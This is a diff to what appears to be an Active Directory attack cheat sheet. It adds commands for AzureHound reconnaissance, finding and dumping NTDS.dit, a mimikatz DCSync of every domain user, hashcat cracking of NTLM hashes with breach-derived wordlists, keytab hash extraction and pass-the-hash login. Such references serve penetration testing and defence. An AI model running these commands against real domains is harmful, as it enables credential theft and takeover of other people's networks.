@@ -141,6 +141,17 @@
   ntlmrelayx.py -t ldaps://lab.local -wh attacker-wpad --delegate-access
   ```
 
+* [AzureHound](https://posts.specterops.io/introducing-bloodhound-4-0-the-azure-update-9b2b26c5e350)
+
+  ```powershell
+  # require: Install-Module -name Az -AllowClobber
+  # require: Install-Module -name AzureADPreview -AllowClobber
+  Connect-AzureAD
+  Connect-AzAccount
+  . .\AzureHound.ps1
+  Invoke-AzureHound
+  ```
+
 * [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
 
   ```powershell
@@ -539,8 +550,18 @@ New-GPOImmediateTask -TaskName Debugging -GPODisplayName VulnGPO -CommandArgumen
 ### Dumping AD Domain Credentials
 
 You will need the following files to extract the ntds : 
-- ntds file (C:\Windows\NTDS\ntds.dit)
+- NTDS.dit file
 - SYSTEM hive (C:\Windows\System32\SYSTEM)
+
+Usually you can find the ntds in two locations : `systemroot\NTDS\ntds.dit` and `systemroot\System32\ntds.dit`.
+- `systemroot\NTDS\ntds.dit` stores the database that is in use on a domain controller. It contains the values for the domain and a replica of the values for the forest (the Configuration container data).
+- `systemroot\System32\ntds.dit` is the distribution copy of the default directory that is used when you install Active Directory on a server running Windows Server 2003 or later to create a domain controller. Because this file is available, you can run the Active Directory Installation Wizard without having to use the server operating system CD.
+
+However you can change the location to a custom one, you will need to query the registry to get the current location.
+
+```powershell
+reg query HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters /v "DSA Database file"
+```
 
 #### Using ndtsutil
 
@@ -653,7 +674,11 @@ cme smb 10.10.0.202 -u username -p password --ntds drsuapi #default
 Any member of Administrators, Domain Admins, or Enterprise Admins as well as Domain Controller computer accounts are able to run DCSync to pull password data. 
 
 ```powershell
+# DCSync only one user
 mimikatz# lsadump::dcsync /domain:htb.local /user:krbtgt
+
+# DCSync all users of the domain
+mimikatz# lsadump::dcsync /domain:htb.local /all /csv
 ```
 
 :warning: Read-Only Domain Controllers are not allowed to pull password data for users by default.
@@ -668,6 +693,30 @@ sekurlsa::krbtgt
 lsadump::lsa /inject /name:krbtgt
 ```
 
+#### Crack NTLM hashes with hashcat
+
+Useful when you want to have the clear text password or when you need to make stats about weak passwords.
+
+Recommended wordlists:
+- rockyou (available in Kali Linux)
+- Have I Been Powned (https://hashes.org/download.php?hashlistId=7290&type=hfound)
+- Collection #1 (passwords from Data Breaches, might be illegal to possess)
+
+```powershell
+# Basic wordlist
+# (-O) will Optimize for 32 characters or less passwords
+# (-w 4) will set the workload to "Insane" 
+$ hashcat64.exe -m 1000 -w 4 -O -a 0 -o pathtopotfile pathtohashes pathtodico -r ./rules/best64.rule --opencl-device-types 1,2
+
+# Generate a custom mask based on a wordlist
+$ git clone https://github.com/iphelix/pack/blob/master/README
+$ python2 statsgen.py ../hashcat.potfile -o hashcat.mask
+$ python2 maskgen.py hashcat.mask --targettime 3600 --optindex -q -o hashcat_1H.hcmask
+```
+
+:warning: If the password is not a confidential data (challenges/ctf), you can use online "cracker" like :
+- [hashes.org](https://hashes.org/check.php)
+- [hashes.com](https://hashes.com/en/decrypt/hash)
 
 ### Password spraying
 
@@ -1670,7 +1719,7 @@ PXE allows a workstation to boot from the network by retrieving an operating sys
     PS > Get-PXECreds -InterfaceAlias « lab 0 » 
 
     # Wait for the DHCP to get an address
-    >> Get a valid IP adress
+    >> Get a valid IP address
     >>> >>> DHCP proposal IP address: 192.168.22.101
     >>> >>> DHCP Validation: DHCPACK
     >>> >>> IP address configured: 192.168.22.101
@@ -1779,9 +1828,20 @@ $ klist.exe -t -K -e -k FILE:C:\Users\User\downloads\krb5.keytab
 [26] Service principal: host/COMPUTER@DOMAIN
 	 KVNO: 25
 	 Key type: 23
-	 Key: 6b3723410a3c54692e400a5862256e0a
+	 Key: 31d6cfe0d16ae931b73c59d7e0c089c0
 	 Time stamp: Oct 07,  2019 09:12:02
 [...]
+```
+
+On Linux you can use [`KeyTabExtract`](https://github.com/sosdave/KeyTabExtract): we want RC4 HMAC hash to reuse the NLTM hash.
+
+```powershell
+$ python3 keytabextract.py krb5.keytab 
+[!] No RC4-HMAC located. Unable to extract NTLM hashes. # No luck
+[+] Keytab File successfully imported.
+        REALM : DOMAIN
+        SERVICE PRINCIPAL : host/computer.domain
+        NTLM HASH : 31d6cfe0d16ae931b73c59d7e0c089c0 # Lucky
 ```
 
 On macOS you can use `bifrost`.
@@ -1793,12 +1853,9 @@ On macOS you can use `bifrost`.
 Connect to the machine using the account and the hash with CME.
 
 ```powershell
-$ crackmapexec 10.XXX.XXX.XXX -u 'COMPUTER$' -H "6b3723410a3c54692e400a5862256e0a" -d "DOMAIN"
-CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 6b3723410a3c54692e400a5862256e0a  
+$ crackmapexec 10.XXX.XXX.XXX -u 'COMPUTER$' -H "31d6cfe0d16ae931b73c59d7e0c089c0" -d "DOMAIN"
+CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 31d6cfe0d16ae931b73c59d7e0c089c0  
 ```
-
-
-
 
 ## References
 
